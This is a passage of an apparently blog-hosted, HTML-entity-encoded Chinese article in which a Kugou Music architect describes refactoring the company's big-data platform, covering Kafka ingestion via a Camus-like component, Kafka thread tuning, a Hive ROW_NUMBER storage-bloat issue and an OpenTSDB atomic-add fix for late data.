4EFD;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x65E2;&#x6EE1;&#x8DB3;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x4E5F;&#x6EE1;&#x8DB3;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;&#xFF0C;&#x4ECE;&#x4E0A;&#x9762;&#x7684;&#x6574;&#x4F53;&#x6280;&#x672F;&#x67B6;&#x6784;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/12.jpg\" alt=\"kafka\"></p>\n<p>KG-Camus&#x7EC4;&#x4EF6;&#x4E5F;&#x662F;&#x57FA;&#x4E8E;&#x67B6;&#x6784;&#x8C03;&#x6574;&#x540E;&#xFF0C;&#x91CD;&#x65B0;&#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x5957;&#x79BB;&#x7EBF;&#x6D88;&#x8D39;Kafka&#x96C6;&#x7FA4;&#x6570;&#x636E;&#x7684;&#x7EC4;&#x4EF6;&#xFF0C;&#x6B64;&#x7EC4;&#x4EF6;&#x662F;&#x53C2;&#x8003;LinkedIn&#x7684;Camus&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x6B64;&#x65B9;&#x5F0F;&#xFF0C;&#x4F7F;&#x6570;&#x636E;&#x6D88;&#x8D39;&#x6A21;&#x5F0F;&#x7531;&#x539F;&#x6765;&#x7684;&#x63A8;&#x65B9;&#x5F0F;&#x6539;&#x4E3A;&#x62C9;&#x6A21;&#x5F0F;&#x4E86;&#xFF0C;&#x4E0D;&#x7528;&#x7EF4;&#x6301;HDFS Client&#x7684;&#x957F;&#x8FDE;&#x63A5;&#x7B49;&#x529F;&#x80FD;&#x4E86;&#xFF0C;&#x76F4;&#x63A5;&#x7531;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#x7CFB;&#x7EDF;&#x6BCF;&#x9694;&#x65F6;&#x95F4;&#x53BB;&#x62C9;&#x4E00;&#x6B21;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x4E1A;&#x52A1;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF0C;&#x4ECE;&#x6B64;&#x67B6;&#x6784;&#x8C03;&#x6574;&#x4E0A;&#x7EBF;&#x540E;&#xFF0C;&#x57FA;&#x672C;&#x6CA1;&#x6709;&#x7C7B;&#x4F3C;&#x7684;&#x5F02;&#x5E38;&#x51FA;&#x73B0;&#x4E86;&#x3002;<br>&#x8FD9;&#x4E2A;&#x5751;&#xFF0C;&#x662F;&#x6211;&#x81EA;&#x5DF1;&#x7ED9;&#x81EA;&#x5DF1;&#x6316;&#x7684;&#xFF0C;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x7684;&#x91CD;&#x6784;&#x8BA1;&#x5212;&#x5EF6;&#x671F;2&#x4E2A;&#x6708;&#xFF0C;&#x4E3B;&#x8981;&#x539F;&#x56E0;&#x662F;&#x7531;&#x6700;&#x521D;&#x6280;&#x672F;&#x9884;&#x7814;&#x7A76;&#x6D4B;&#x8BD5;&#x4E0D;&#x5145;&#x5206;&#x6240;&#x5BFC;&#x81F4;&#x3002;</p>\n<h3 id=\"3-&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x7684;&#x5751;\"><a href=\"#3-&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x7684;&#x5751;\" class=\"headerlink\" title=\"3.&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x7684;&#x5751;\"></a>3.&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x7684;&#x5751;</h3><p>&#x7531;&#x4E8E;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x6D89;&#x53CA;&#x5230;&#x7684;&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x5F88;&#x591A;&#xFF0C;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#x4E5F;&#x662F;&#x5341;&#x4E2A;&#x624B;&#x6307;&#x6570;&#x4E0D;&#x8FC7;&#x6765;&#x3002;</p>\n<p>(1)&#x3001;&#x5F53;&#x6211;&#x4EEC;&#x7684;&#x884C;&#x4E3A;&#x6570;&#x636E;&#x5168;&#x91CF;&#x63A5;&#x5165;&#x5230;Kafka&#x96C6;&#x7FA4;(&#x51E0;&#x767E;&#x4EBF;/&#x5929;)&#xFF0C;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5361;&#x51FA;&#x73B0;&#x5927;&#x91CF;&#x8FDE;&#x63A5;&#x8D85;&#x65F6;&#x73B0;&#x8C61;&#xFF0C;&#x4F46;&#x4E07;&#x5146;&#x7F51;&#x5361;&#x8FDB;&#x51FA;&#x6D41;&#x91CF;&#x4F7F;&#x7528;&#x7387;&#x5E76;&#x4E0D;&#x662F;&#x5F88;&#x9AD8;&#xFF0C;&#x53EA;&#x6709;&#x51E0;&#x767E;Mbit/s&#xFF0C;&#x7ECF;&#x8FC7;&#x5927;&#x91CF;&#x7684;&#x6D4B;&#x8BD5;&#x6392;&#x67E5;&#x540E;&#xFF0C;&#x8C03;&#x6574;&#x4EE5;&#x4E0B;&#x53C2;&#x6570;&#xFF0C;&#x5C31;&#x662F;&#x987A;&#x5229;&#x89E3;&#x51B3;&#x4E86;&#x6B64;&#x95EE;&#x9898;&#x3002;&#x8C03;&#x6574;&#x53C2;&#x6570;&#x540E;&#x7F51;&#x5361;&#x6D41;&#x91CF;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;</p>\n<p>a)&#x3001;num.network.threads(&#x7F51;&#x7EDC;&#x5904;&#x7406;&#x7EBF;&#x7A0B;&#x6570;)&#x503C;&#x5E94;&#x8BE5;&#x6BD4;cpu&#x6570;&#x7565;&#x5927;<br>b)&#x3001;num.io.threads(&#x63A5;&#x6536;&#x7F51;&#x7EDC;&#x7EBF;&#x7A0B;&#x8BF7;&#x6C42;&#x5E76;&#x5904;&#x7406;&#x7EBF;&#x7A0B;&#x6570;)&#x503C;&#x63D0;&#x9AD8;&#x4E3A;cpu&#x6570;&#x4E24;&#x500D;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/13.jpg\" alt=\"&#x8FDE;&#x63A5;&#x8D85;&#x65F6;\"><br>(2)&#x3001;&#x5728;hive0.14 &#x7248;&#x672C;&#x4E2D;&#xFF0C;&#x5229;&#x7528;&#x51FD;&#x6570;ROW_NUMBER OVER&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5904;&#x7406;&#x540E;&#xFF0C;&#x5BFC;&#x81F4;&#x5927;&#x91CF;&#x7684;&#x4F5C;&#x4E1A;&#x51FA;&#x73B0;&#x5EF6;&#x65F6;&#x5F88;&#x5927;&#x7684;&#x73B0;&#x8C61;&#xFF0C;&#x7ECF;&#x5F02;&#x5E38;&#x6392;&#x67E5;&#x540E;&#xFF0C;&#x53D1;&#x73B0;&#x5728;&#x6570;&#x636E;&#x8BB0;&#x5F55;&#x6570;&#x6CA1;&#x53D8;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6570;&#x636E;&#x7684;&#x5B58;&#x50A8;&#x5BB9;&#x91CF;&#x6269;&#x5927;&#x5230;&#x539F;&#x6765;&#x7684;5&#x500D;&#x5DE6;&#x53F3;&#xFF0C;&#x5BFC;&#x81F4;MapReduce&#x6267;&#x884C;&#x5F88;&#x6162;&#x9020;&#x6210;&#x7684;&#x3002;&#x6539;&#x4E3A;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x7C7B;&#x4F3C;&#x7684;&#x51FD;&#x6570;&#x540E;&#xFF0C;&#x89E3;&#x51B3;&#x4E86;&#x5BB9;&#x91CF;&#x6269;&#x5927;&#x4E3A;&#x539F;&#x6765;&#x51E0;&#x500D;&#x7684;&#x73B0;&#x8C61;&#x3002;&#x8BF4;&#x5230;&#x8FD9;&#x91CC;&#xFF0C;&#x4E5F;&#x5728;&#x6B64;&#x8BF7;&#x6559;&#x8BFB;&#x5230;&#x6B64;&#x5904;&#x7684;&#x8BFB;&#x8005;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5728;&#x6D77;&#x91CF;&#x6570;&#x636E;&#x53BB;&#x91CD;&#x4E2D;&#x91C7;&#x7528;&#x4EC0;&#x4E48;&#x7B97;&#x6CD5;&#x6216;&#x7EC4;&#x4EF6;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#x5408;&#x9002;&#xFF0C;&#x65E2;&#x80FD;&#x9AD8;&#x6027;&#x80FD;&#x53C8;&#x80FD;&#x9AD8;&#x51C6;&#x786E;&#x6027;&#xFF0C;&#x6709;&#x597D;&#x7684;&#x5EFA;&#x8BAE;&#x6216;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x53EF;&#x4EE5;&#x52A0;happyjim2010&#x5FAE;&#x4FE1;&#x79C1;&#x6211;&#x3002;</p>\n<p>(3)&#x3001;&#x5728;&#x4E1A;&#x52A1;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x7528;OpenTSDB&#x4E0E;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x7CFB;&#x7EDF;(storm)&#x7ED3;&#x5408;&#xFF0C;&#x7528;&#x4E8E;&#x805A;&#x5408;&#x5E76;&#x5B58;&#x50A8;&#x5B9E;&#x65F6;metric&#x6570;&#x636E;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x5B9E;&#x73B0;&#x4E2D;&#xFF0C;&#x901A;&#x5E38;&#x9700;&#x8981;&#x5728;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x90E8;&#x5206;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x7A97;&#x53E3;(window)&#xFF0C;&#x7528;&#x4E8E;&#x805A;&#x5408;&#x5B9E;&#x65F6;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x805A;&#x5408;&#x7ED3;&#x679C;&#x5199;&#x5165;tsdb&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x7531;&#x4E8E;&#x5728;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x4E2D;&#xFF0C;&#x5B9E;&#x65F6;&#x6570;&#x636E;&#x5728;&#x91C7;&#x96C6;&#x3001;&#x4E0A;&#x62A5;&#x9636;&#x6BB5;&#x53EF;&#x80FD;&#x4F1A;&#x5B58;&#x5728;&#x5EF6;&#x65F6;&#xFF0C;&#x800C;&#x5BFC;&#x81F4;tsdb&#x5199;&#x5165;&#x7684;&#x6570;&#x636E;&#x4E0D;&#x51C6;&#x786E;&#x3002;&#x9488;&#x5BF9;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x6539;&#x8FDB;&#xFF0C;&#x5728;&#x539F;&#x6709;tsdb&#x5199;&#x5165;api&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x589E;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;&#x539F;&#x5B50;&#x52A0;&#x7684;api&#x3002;&#x8FD9;&#x6837;&#xFF0C;&#x5EF6;&#x8FDF;&#x5230;&#x6765;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x88AB;&#x53E0;&#x52A0;&#x5230;&#x4E4B;&#x524D;&#x5199;&#x5165;&#x7684;&#x6570;&#x636E;&#x4E4B;&#x4E0A;&#xFF0C;&#x5B9E;&#x65F6;&#x7684;&#x51C6;&#x786E;&#x6027;&#x7531;&#x4E8E;&#x4E0D;&#x53EF;&#x907F;&#x514D;&#x7684;&#x539F;&#x56E0;(&#x91C7;&#x96C6;&#x3001;&#x4E0A;&#x62A5;&#x9636;&#x6BB5;)&#x4EA7;&#x751F;&#x4E86;&#x5EF6;&#x8FDF;&#xFF0C;&#x5230;&#x6700;&#x7EC8;&#x7684;&#x51C6;&#x786E;&#x6027;&#x4E5F;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4FDD;&#x8BC1;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x6DFB;&#x52A0;&#x4E86;&#x8FD9;&#x4E2A;&#x6539;&#x8FDB;&#x4E4B;&#x540E;&#xFF0C;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x7AEF;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#x5C31;&#x4E0D;&#x9700;&#x8981;&#x56E0;&#x4E3A;&#x8003;&#x8651;&#x5EF6;&#x8FDF;&#x95EE;&#x9898;&#x8BBE;&#x7F6E;&#x5F97;&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x8FD9;&#x6837;&#x65E2;&#x8282;&#x7701;&#x4E86;&#x5185;&#x5B58;&#x7684;&#x6D88;&#x8017;&#xFF0C;&#x4E5F;&#x63D0;&#x9AD8;&#x4E86;&#x5B9E;&#x65F6;&#x6027;&#x3002;</p>\n<h2 id=\"&#x56DB;&#x3001;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;\"><a href=\"#&#x56DB;&#x3001;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;\" class=\"headerlink\" title=\"&#x56DB;&#x3001;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;\"></a>&#x56DB;&#x3001;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;</h2><p>&#x6570;&#x636E;&#x5B58;&#x50A8;(&#x5206;&#x5E03;&#x5F0F;&#x5185;&#x5B58;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;(Tachyon)&#x3001;&#x6570;&#x636E;&#x591A;&#x4ECB;&#x8D28;&#x5206;&#x5C42;&#x5B58;&#x50A8;&#x3001;&#x6570;&#x636E;&#x5217;&#x5F0F;&#x5B58;&#x50A8;)&#x3001;&#x5373;&#x5E2D;&#x67E5;&#x8BE2;(OLAP)&#x3001;&#x8D44;&#x6E90;&#x9694;&#x79BB;&#x3001;&#x6570;&#x636E;&#x5B89;&#x5168;&#x3001;&#x5E73;&#x53F0;&#x5FAE;&#x89C2;&#x5C42;&#x9762;&#x76D1;&#x63A7;&#x3001;&#x6570;&#x636E;&#x5BF9;&#x5916;&#x670D;&#x52A1;&#x7B49;&#x3002;</p>\n<p>&#x4F5C;&#x8005;&#x4ECB;&#x7ECD;&#xFF1A;&#x738B;&#x52B2;&#xFF1A;&#x76EE;&#x524D;&#x5C31;&#x804C;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#xFF0C;&#x5927;&#x6570;&#x636E;&#x67B6;&#x6784;&#x5E08;&#xFF0C;&#x8D1F;&#x8D23;&#x9177;&#x72D7;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x89C4;&#x5212;&#x3001;&#x5EFA;&#x8BBE;&#x3001;&#x5E94;&#x7528;&#x3002; 11&#x5E74;&#x7684;IT&#x4ECE;&#x4E1A;&#x7ECF;&#x9A8C;&#xFF0C;2&#x5E74;&#x5206;&#x5E03;&#x5F0F;&#x5E94;&#x7528;&#x5F00;&#x53D1;&#xFF0C;3&#x5E74;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x5B9E;&#x8DF5;&#x7ECF;&#x9A8C;&#xFF0C;&#x4E3B;&#x8981;&#x7814;&#x7A76;&#x65B9;&#x5411;&#x6D41;&#x5F0F;&#x8BA1;&#x7B97;&#x3001;&#x5927;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x8BA1;&#x7B97;&#x3001;&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x3001;NoSQL&#x3001;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x7B49;&#x3002;</p>\n","excerpt":"<blockquote>\n<p>&#x672C;&#x6587;&#x662F;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x7684;&#x67B6;&#x6784;&#x5E08;&#x738B;&#x52B2;&#x5BF9;&#x9177;&#x72D7;&#x5927;&#x6570;&#x636E;&#x67B6;&#x6784;&#x91CD;&#x6784;&#x7684;&#x603B;&#x7ED3;&#x3002;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x7684;&#x5927;&#x6570;&#x636E;&#x67B6;&#x6784;&#x672C;&#x8EAB;&#x5F88;&#x7ECF;&#x5178;&#xFF0C;&#x800C;&#x8FD9;&#x7BC7;&#x8BB2;&#x89E3;&#x4E86;&#x5BF9;&#x539F;&#x6765;&#x7684;&#x67B6;&#x6784;&#x4E0A;&#x8FDB;&#x884C;&#x91CD;&#x6784;&#x7684;&#x5DE5;&#x4F5C;&#x5185;&#x5BB9;&#xFF0C;&#x603B;&#x5171;&#x5206;&#x4E3A;<strong>&#x91CD;&#x6784;&#x7684;&#x539F;&#x56E0;&#x3001;&#x65B0;&#x4E00;&#x4EE3;&#x7684;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x67B6;&#x6784;&#x3001;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#x3001;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;</strong>&#x56DB;&#x4E2A;&#x90E8;&#x5206;&#x6765;&#x7ED9;&#x5927;&#x5BB6;&#x8C08;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x7684;&#x8FC7;&#x7A0B;&#x3002;</p>\n</blockquote>\n<p>&#x7728;&#x773C;&#x5C31;&#x662F;&#x65B0;&#x7684;&#x4E00;&#x5E74;&#x4E86;&#xFF0C;&#x65F6;&#x95F4;&#x8FC7;&#x7684;&#x771F;&#x5FEB;&#xFF0C;&#x8D81;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x4E00;&#x76F4;&#x5728;&#x5199;&#x603B;&#x7ED3;&#x7684;&#x673A;&#x4F1A;&#xFF0C;&#x4E5F;&#x603B;&#x7ED3;&#x4E0B;&#x4E0A;&#x4E00;&#x5E74;&#x7684;&#x5DE5;&#x4F5C;&#x7ECF;&#x9A8C;&#xFF0C;&#x907F;&#x514D;&#x91CD;&#x590D;&#x8E29;&#x5751;&#x3002;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x6574;&#x6574;&#x7ECF;&#x5386;&#x4E86;&#x4E00;&#x5E74;&#x65F6;&#x95F4;&#xFF0C;&#x5927;&#x5934;&#x7684;&#x884C;&#x4E3A;&#x6D41;&#x6C34;&#x6570;&#x636E;&#x8FC1;&#x79FB;&#x5230;&#x65B0;&#x5E73;&#x53F0;&#x7A33;&#x5B9A;&#x8FD0;&#x884C;&#xFF0C;&#x5728;&#x8FD9;&#x8FC7;&#x7A0B;&#x4E2D;&#x586B;&#x8FC7;&#x5751;&#xFF0C;&#x6316;&#x8FC7;&#x5751;&#xFF0C;&#x4E3A;&#x540E;&#x7EED;&#x4E1A;&#x52A1;&#x7684;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x9700;&#x6C42;&#x6253;&#x4E0B;&#x4E86;&#x5F88;&#x597D;&#x7684;&#x57FA;&#x7840;&#x3002;&#x5728;&#x6B64;&#x611F;&#x8C22;&#x9177;&#x72D7;&#x56E2;&#x961F;&#x6210;&#x5458;&#x7684;&#x4E0D;&#x61C8;&#x52AA;&#x529B;&#xFF0C;&#x5927;&#x90E8;&#x5206;&#x4ECE;&#x5F00;&#x59CB;&#x53EA;&#x77E5;&#x9053;&#x5927;&#x6570;&#x636E;&#x8FD9;&#x4E2A;&#x6982;&#x5FF5;&#xFF0C;&#x5230;&#x73B0;&#x5728;&#x6210;&#x4E3A;&#x56E2;&#x961F;&#x7684;&#x6280;&#x672F;&#x652F;&#x67F1;&#xFF0C;&#x611F;&#x5230;&#x5F88;&#x6B23;&#x6170;&#x3002;</p>\n<p>&#x4ECE;&#x91CD;&#x6784;&#x539F;&#x56E0;&#xFF0C;&#x6280;&#x672F;&#x67B6;&#x6784;&#xFF0C;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#xFF0C;&#x540E;&#x7EED;&#x6301;&#x7EED;&#x6539;&#x8FDB;&#x56DB;&#x4E2A;&#x65B9;&#x9762;&#x6765;&#x63CF;&#x8FF0;&#x9177;&#x72D7;&#x97F3;&#x4E50;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x5728;&#x6B64;&#x629B;&#x7816;&#x5F15;&#x7389;&#xFF0C;&#x8FD9;&#x6B21;&#x7684;&#x5185;&#x5BB9;&#x4E0E;6&#x6708;&#x4EFD;&#x5728;&#x9AD8;&#x53EF;&#x7528;&#x67B6;&#x6784;&#x7FA4;&#x5206;&#x4EAB;&#x7684;&#x5927;&#x6570;&#x636E;&#x6280;&#x672F;&#x5B9E;&#x8DF5;&#x7684;&#x6709;&#x70B9;&#x4E0D;&#x540C;&#xFF0C;&#x6280;&#x672F;&#x67B6;&#x6784;&#x505A;&#x4E86;&#x4E9B;&#x8C03;&#x6574;&#x3002;</p>\n<p>&#x5176;&#x5B9E;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x662F;&#x4E00;&#x4E2A;&#x5E9E;&#x5927;&#x7684;&#x7CFB;&#x7EDF;&#x5DE5;&#x7A0B;&#xFF0C;&#x6574;&#x4E2A;&#x5EFA;&#x8BBE;&#x5468;&#x671F;&#x5F88;&#x957F;&#xFF0C;&#x6D89;&#x53CA;&#x7684;&#x751F;&#x6001;&#x94FE;&#x5F88;&#x957F;(&#x5305;&#x62EC;&#xFF1A;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x3001;&#x63A5;&#x5165;&#xFF0C;&#x6E05;&#x6D17;&#x3001;&#x5B58;&#x50A8;&#x8BA1;&#x7B97;&#x3001;&#x6570;&#x636E;&#x6316;&#x6398;&#xFF0C;&#x53EF;&#x89C6;&#x5316;&#x7B49;&#x73AF;&#x8282;&#xFF0C;&#x6BCF;&#x4E2A;&#x73AF;&#x8282;&#x90FD;&#x5F53;&#x505A;&#x4E00;&#x4E2A;&#x590D;&#x6742;&#x7684;&#x7CFB;&#x7EDF;&#x6765;&#x5EFA;&#x8BBE;)&#xFF0C;&#x98CE;&#x9669;&#x4E5F;&#x5F88;&#x5927;&#x3002;<br></p>","more":"<p></p>\n<h2 id=\"&#x4E00;&#x3001;&#x91CD;&#x6784;&#x539F;&#x56E0;\"><a href=\"#&#x4E00;&#x3001;&#x91CD;&#x6784;&#x539F;&#x56E0;\" class=\"headerlink\" title=\"&#x4E00;&#x3001;&#x91CD;&#x6784;&#x539F;&#x56E0;\"></a>&#x4E00;&#x3001;&#x91CD;&#x6784;&#x539F;&#x56E0;</h2><p>&#x5728;&#x8BB2;&#x91CD;&#x6784;&#x539F;&#x56E0;&#x524D;&#xFF0C;&#x5148;&#x4ECB;&#x7ECD;&#x4E0B;&#x539F;&#x6709;&#x7684;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x67B6;&#x6784;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/%E9%85%B7%E7%8B%97%E9%9F%B3%E4%B9%90%E7%9A%84%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E9%87%8D%E6%9E%84/1.jpg\" alt=\"&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x67B6;&#x6784;\"></p>\n<p>&#x4ECE;&#x4E0A;&#x56FE;&#x53EF;&#x77E5;&#xFF0C;&#x4E3B;&#x8981;&#x57FA;&#x4E8E;Hadoop1.x+hive&#x505A;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;(T+1)&#xFF0C;&#x57FA;&#x4E8E;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x7684;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x3001;&#x6570;&#x636E;&#x63A5;&#x5165;&#x3001;&#x6570;&#x636E;&#x6E05;&#x6D17;&#x3001;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#x3001;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x51E0;&#x4E2A;&#x73AF;&#x8282;&#x5B58;&#x5728;&#x7684;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#x6765;&#x5217;&#x4E3E;&#x4E0B;&#x3002;</p>\n<h3 id=\"&#x6570;&#x636E;&#x91C7;&#x96C6;&#xFF1A;\"><a href=\"#&#x6570;&#x636E;&#x91C7;&#x96C6;&#xFF1A;\" class=\"headerlink\" title=\"&#x6570;&#x636E;&#x91C7;&#x96C6;&#xFF1A;\"></a>&#x6570;&#x636E;&#x91C7;&#x96C6;&#xFF1A;</h3><p>1&#x3001;&#x6570;&#x636E;&#x6536;&#x96C6;&#x63A5;&#x53E3;&#x4F17;&#x591A;&#xFF0C;&#x4E14;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x6DF7;&#x4E71;&#xFF0C;&#x57FA;&#x672C;&#x6BCF;&#x4E2A;&#x4E1A;&#x52A1;&#x90FD;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x4E0A;&#x62A5;&#x63A5;&#x53E3;<br>2&#x3001;&#x5B58;&#x5728;&#x8F83;&#x5927;&#x7684;&#x91CD;&#x590D;&#x5F00;&#x53D1;&#x6210;&#x672C;<br>3&#x3001;&#x4E0D;&#x80FD;&#x6C47;&#x603B;&#x4E0A;&#x62A5;&#xFF0C;&#x6D88;&#x8017;&#x5BA2;&#x6237;&#x7AEF;&#x8D44;&#x6E90;&#xFF0C;&#x4EE5;&#x53CA;&#x7F51;&#x7EDC;&#x6D41;&#x91CF;<br>4&#x3001;&#x6BCF;&#x4E2A;&#x63A5;&#x53E3;&#x6536;&#x96C6;&#x6570;&#x636E;&#x9879;&#x548C;&#x683C;&#x5F0F;&#x4E0D;&#x7EDF;&#x4E00;&#xFF0C;&#x52A0;&#x5927;&#x540E;&#x671F;&#x6570;&#x636E;&#x7EDF;&#x8BA1;&#x5206;&#x6790;&#x96BE;&#x5EA6;<br>5&#x3001;&#x5404;&#x4E2A;&#x63A5;&#x53E3;&#x5B9E;&#x73B0;&#x8D28;&#x91CF;&#x5E76;&#x4E0D;&#x9AD8;&#xFF0C;&#x5B58;&#x5728;&#x88AB;&#x5237;&#xFF0C;&#x6CC4;&#x5BC6;&#x7B49;&#x98CE;&#x9669;</p>\n<h3 id=\"&#x6570;&#x636E;&#x63A5;&#x5165;\"><a href=\"#&#x6570;&#x636E;&#x63A5;&#x5165;\" class=\"headerlink\" title=\"&#x6570;&#x636E;&#x63A5;&#x5165;:\"></a>&#x6570;&#x636E;&#x63A5;&#x5165;:</h3><p>1&#x3001;&#x901A;&#x8FC7;rsync&#x540C;&#x6B65;&#x6587;&#x4EF6;&#xFF0C;&#x5F88;&#x96BE;&#x6EE1;&#x8DB3;&#x5B9E;&#x65F6;&#x6D41;&#x8BA1;&#x7B97;&#x7684;&#x9700;&#x6C42;<br>2&#x3001;&#x63A5;&#x5165;&#x6570;&#x636E;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x540E;&#xFF0C;&#x5F88;&#x96BE;&#x6392;&#x67E5;&#x53CA;&#x5B9A;&#x4F4D;&#x95EE;&#x9898;&#xFF0C;&#x9700;&#x8981;&#x5F88;&#x9AD8;&#x7684;&#x4EBA;&#x529B;&#x6210;&#x672C;&#x6392;&#x67E5;<br>3&#x3001;&#x4E1A;&#x52A1;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x901A;&#x8FC7;Kettle&#x6BCF;&#x5929;&#x5168;&#x91CF;&#x540C;&#x6B65;&#x5230;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#xFF0C;&#x540C;&#x6B65;&#x65F6;&#x95F4;&#x957F;&#xFF0C;&#x5BFC;&#x81F4;&#x4F9D;&#x8D56;&#x7684;&#x4F5C;&#x4E1A;&#x7ECF;&#x5E38;&#x4F1A;&#x6709;&#x5EF6;&#x65F6;&#x73B0;&#x8C61;</p>\n<h3 id=\"&#x6570;&#x636E;&#x6E05;&#x6D17;&#xFF1A;\"><a href=\"#&#x6570;&#x636E;&#x6E05;&#x6D17;&#xFF1A;\" class=\"headerlink\" title=\"&#x6570;&#x636E;&#x6E05;&#x6D17;&#xFF1A;\"></a>&#x6570;&#x636E;&#x6E05;&#x6D17;&#xFF1A;</h3><p>1&#x3001;ETL&#x96C6;&#x4E2D;&#x5728;&#x4F5C;&#x4E1A;&#x8BA1;&#x7B97;&#x524D;&#x8FDB;&#x884C;&#x5904;&#x7406;<br>2&#x3001;&#x5B58;&#x5728;&#x91CD;&#x590D;&#x6E05;&#x6D17;</p>\n<h3 id=\"&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#xFF1A;\"><a href=\"#&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#xFF1A;\" 